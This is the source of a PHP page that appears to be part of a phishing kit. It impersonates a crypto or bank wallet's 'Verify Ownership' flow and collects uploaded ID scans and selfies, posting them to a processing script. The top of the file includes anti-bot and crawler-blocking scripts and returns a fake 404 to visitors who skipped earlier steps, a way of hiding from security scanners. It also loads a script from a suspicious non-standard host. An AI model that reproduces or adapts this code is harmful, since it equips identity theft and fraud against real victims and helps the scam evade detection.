<?php

error_reporting(0);
session_start();
        include'antibots/IP-BlackList.php';  
        include'antibots/Bot-Crawler.php';
        include'antibots/Bot-Spox.php'; 
        include'antibots/Dila_DZ.php';
        @require "antibots/Crawler/src/CrawlerDetect.php";

        use JayBizzle\CrawlerDetect\CrawlerDetect;
        
if (!isset($_POST['doc_type'])) {

  header("HTTP/1.0 404 Not Found");
  exit();
}
$_SESSION['css5'] = "true";

?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <link rel="shortcut icon" href="./assets/images/favi.ico">
      <link rel="apple-touch-icon" href="./assets/images/favi.png">
      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
      <title>My Account: Wallet</title>
      <link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
      <link rel="stylesheet" href="./assets/css/5.php">
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.1/modernizr.min.js"></script>
      <meta http-equiv="cache-control" content="no-cache">
      <meta http-equiv="expires" content="0">
      <meta http-equiv="pragma" content="no-cache">
      </script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
   </head>
   <body>
      <header>
         <div></div>
      </header>
      <div class="mainContainer ">
      <div class="bg">
      </div>
      <div class="hide" id="rotate">
         <div class="circle">
         </div>
         <div class="overlay">
         </div>
      </div>
      <div class="contents">
         <div class="modal hide js-modal">
            <div class="l-modal-shadow js-modal-hide"></div>
            <div class="c-popup l-modal-body">
               <div class="c-popup-img">
                  <img src="assets/images/warning.png" />
               </div>
               <h3 class="c-popup-title">Warning!</h3>
               <p class="c-popup-description">Complete the progress first</p>
               <input style="width:50%" class="bt js-modal-hide" type="submit" value="Continue">
            </div>
         </div>
         <div class="mainContents">
            <a href="#" class="close-icon js-modal-hide"></a>
            <ol class="steps js-modal-hide">
               <li id="signed"><a class="signed" href="#">Signed</a></li>
               <li id="Protected"><a class="Protected" href="#">Protected</a></li>
               <li id="Verify"><a class="Verify" href="#">Verify Ownership</a></li>
               <li id="Billing"><a class="Billing" href="#">Billing</a></li>
               <li id="Upload"><a class="Upload" href="#">Upload ID</a></li>
               <li id="Completed"><a class="Completed" href="#">Completed</a></li>
            </ol>
            <div id="process">
               <div style="padding:0 20px">
                  <div>
                     <ol class="proof">
                        <li class="itm current">
                           <div class="ui-text-small">
                              Identity Proof
                           </div>
                        </li>
                        <li class="itm">
                           <div class="ui-text-small">
                              Selfie With Proof
                           </div>
                        </li>
                     </ol>
                  </div>
                  <div id="select_one">
                     <form action="./process/config5.php" method="POST" enctype='multipart/form-data' >
                        
                        <div id="area_up_id">
                           <h1 style="font-size:1.4rem">
                              Upload your
                              <span>
                              </span>
                           </h1>
                           <div class="row rules text-center">
                              <div class="rule">
                                 <img src="./assets/images/scan_id.svg" alt="">
                                 <div>Take a high quality photo or make a high quality scan
                                 </div>
                              </div>
                              <div class="rule">
                                 <img src="./assets/images/both_sides.svg" alt="">
                                 <div>
                                    Submit both sides of a double-sided document
                                 </div>
                              </div>
                              <div class="rule">
                                 <img src="./assets/images/both_pass.svg" alt="">
                                 <div>
                                    Scan both pages if you choose a passport
                                 </div>
                              </div>
                           </div>
                           <div class="zone" id="up_id_zone">
                              <div class="dropzone-main" style="display:block">
                                 <div class="dropzone-img">
                                    <input style="display:none" type="file" name="file" accept="image/*" multiple>
                                 </div>
                                 <p>
                                    <b>Drag and drop or click here</b> to upload your image (max 5 MB)
                                 </p>
                              </div>
                           </div>
                           <div class="imagesArea">
                           </div>

                           <input style="margin-bottom:1rem;margin-top:1rem" name="img_submit" type="submit" class="bt" value="Process">
                           <div>
                             <script type="text/javascript">
                                $("#Billing,#Verify,#Upload,#Completed").removeClass("current");
                                 $("#Upload").addClass("current"); 
                             </script>
                           </div>
                        </div>
                     </form>
                     
                     
                  </div>
                 
               </div>
               <script>
                  function readFile(files, me, check) {
                     if (files) {
                     for (var i = 0; i < files.length; i++) {
                        var FR = new FileReader();
                        FR.onload = function(e) {
                        if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
                           if (check) {
                           $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                           } else {
                           $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                           }
                           $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                        }
                        }
                        FR.readAsDataURL(files[i]);
                     }
                     }
                  }
                  $(document).on('click', '.zone', function(e) {
                     e.stopPropagation();
                     $(this).find('input[type=file]').trigger(e);
                  });
                  $(document).on('click', '.btDel', function() {
                     $(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
                     $(this).parent().remove();
                  });
                  $(document).on('change', 'input[type=file]', function() {
                     readFile(this.files, this, false);
                  });
                  $(".dropzone-main").on('dragleave', function(e) {
                     e.preventDefault();
                     $(this).css('border', '2px dashed #dee3e7');
                     $(this).css('background', '#f0f2f4');
                  });
                  $(".dropzone-main").on('dragover', function(e) {
                     e.preventDefault();
                     $(this).css('border', '2px dashed #0564b3');
                     $(this).css('background', '#ecf1f9');
                  });
                  $(".dropzone-main").on('drop', function(e) {
                     e.preventDefault();
                     $(this).css('border', '2px dashed #41ad49');
                     readFile(e.originalEvent.dataTransfer.files, this, true);
                  });
               </script>
            </div>
         </div>
         <script type="text/javascript">
            $(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
            $(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
         </script>
      </div>
   </body>
</html>